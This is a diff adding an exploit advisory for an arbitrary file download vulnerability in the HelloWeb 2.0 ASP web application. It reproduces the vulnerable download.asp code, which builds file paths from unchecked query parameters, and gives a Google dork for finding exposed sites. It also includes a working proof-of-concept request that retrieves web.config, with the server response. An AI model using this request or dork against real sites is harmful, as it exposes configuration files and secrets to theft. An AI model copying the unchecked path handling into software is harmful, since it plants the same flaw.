@@ -1,0 +1,72 @@
+# Exploit Title: HelloWeb 2.0 - Arbitrary File Download
+# Date: 2020-07-09
+# Vendor Homepage: https://helloweb.co.kr/
+# Version: 2.0 [Latest] and previous versions
+# Exploit Author: bRpsd
+# Contact Author: cy[at]live.no
+# Google Dork: inurl:exec/file/download.asp
+# Type: WebApps / ASP
+-----------------------------------------------------
+
+
+
+Vulnerable code:
+######################################################################################################
+Dim filepath, filename, root_path, fso, root_folder, attachfile, objStream, strFile
+
+filepath = Request.QueryString("filepath")
+filename = Request.QueryString("filename")
+filepath = Replace(filepath,"/","\")
+
+root_path = server.MapPath("/")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set root_folder = fso.GetFolder(root_path)
+
+attachfile = root_path & filepath & "\" & filename
+
+Response.Clear
+Response.ContentType = "application/unknown"
+Response.AddHeader "Pragma", "no-cache"
+Response.AddHeader "Expires", "0"
+Response.AddHeader "Content-Transfer-Encoding", "binary"
+Response.AddHeader "Content-Disposition","attachment; filename = " & Server.URLPathEncode(filename)
+
+Set objStream = Server.CreateObject("ADODB.Stream")
+objStream.Open
+
+objStream.Type = 1
+objStream.LoadFromFile attachfile
+
+Response.BinaryWrite objStream.Read
+Response.Flush
+######################################################################################################
+
+Vulnerability: Arbitrary File Download
+Location: http://localhost/exec/file/download.asp
+Parameters: filename & filepath
+
+Proof of concept:
+
+GET /exec/file/download.asp?filepath=/&filename=web.config HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+RESPONSE:
+HTTP/1.1 200 OK
+Cache-Control: private
+Pragma: no-cache
+Content-Type: application/unknown; Charset=utf-8
+Expires: 0,Thu, 09 Jul 2020 10:51:14 GMT
+Server:
+Content-Transfer-Encoding: binary
+Content-Disposition: attachment; filename = web.config
+Set-Cookie: ASPSESSIONIDQQCBDRBB=BEMDPMDDKFHNFKFMJGHIKKKI; path=/
+Access-Control-Allow-Origin: *
+x-xss-protection: 1; mode=block
+Date: Thu, 09 Jul 2020 10:51:14 GMT
+Connection: close
